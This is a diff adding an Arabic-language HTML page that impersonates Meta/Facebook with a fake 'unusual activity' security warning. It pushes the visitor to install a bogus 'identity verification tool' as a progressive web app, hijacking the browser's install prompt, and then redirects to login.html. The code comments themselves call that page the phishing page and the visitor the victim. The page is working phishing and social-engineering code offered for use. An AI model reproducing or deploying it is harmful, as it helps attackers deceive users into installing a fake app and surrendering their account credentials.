@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأمين الحساب - Meta</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body { font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 350px; width: 90%; }
+        .logo { width: 70px; margin-bottom: 20px; }
+        h2 { font-size: 20px; color: #1c1e21; margin-bottom: 10px; }
+        p { font-size: 15px; color: #606770; line-height: 1.5; margin-bottom: 25px; }
+        .install-btn { background-color: #1877f2; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; transition: 0.3s; }
+        .install-btn:active { transform: scale(0.98); background-color: #166fe5; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB" class="logo">
+        <h2>نشاط غير معتاد</h2>
+        <p>لحماية حسابك، يرجى تثبيت "أداة التحقق من الهوية" على شاشتك الرئيسية لمتابعة عملية التأمين.</p>
+        <button id="btnInstall" class="install-btn">تثبيت الأداة الآن</button>
+    </div>
+
+    <script>
+        // تسجيل الـ Service Worker (ضروري جداً لظهور زر التثبيت)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js')
+            .then(() => console.log("Service Worker Registered"));
+        }
+
+        let deferredPrompt;
+        const btnInstall = document.getElementById('btnInstall');
+
+        // قنص حدث التثبيت قبل أن يظهر تلقائياً
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            // إظهار الزر للضحية
+            btnInstall.style.display = 'block';
+        });
+
+        btnInstall.addEventListener('click', async () => {
+            if (deferredPrompt) {
+                // إظهار نافذة النظام (أندرويد/آيفون) للتثبيت
+                deferredPrompt.prompt();
+                const { outcome } = await deferredPrompt.userChoice;
+                if (outcome === 'accepted') {
+                    console.log('User accepted the install');
+                    // بمجرد قبول التثبيت، ننتظر لحظة ثم نوجهه لصفحة الصيد
+                    setTimeout(() => {
+                        window.location.href = "login.html";
+                    }, 2000);
+                }
+            } else {
+                // إذا كان التطبيق مثبتاً بالفعل أو المتصفح لا يدعم، نتوجه فوراً للصيد
+                window.location.href = "login.html";
+            }
+        });
+
+        // إذا تم التثبيت بنجاح، وجه الضحية لصفحة تسجيل الدخول
+        window.addEventListener('appinstalled', () => {
+            window.location.href = "login.html";
+        });
+    </script>
+</body>
+</html>
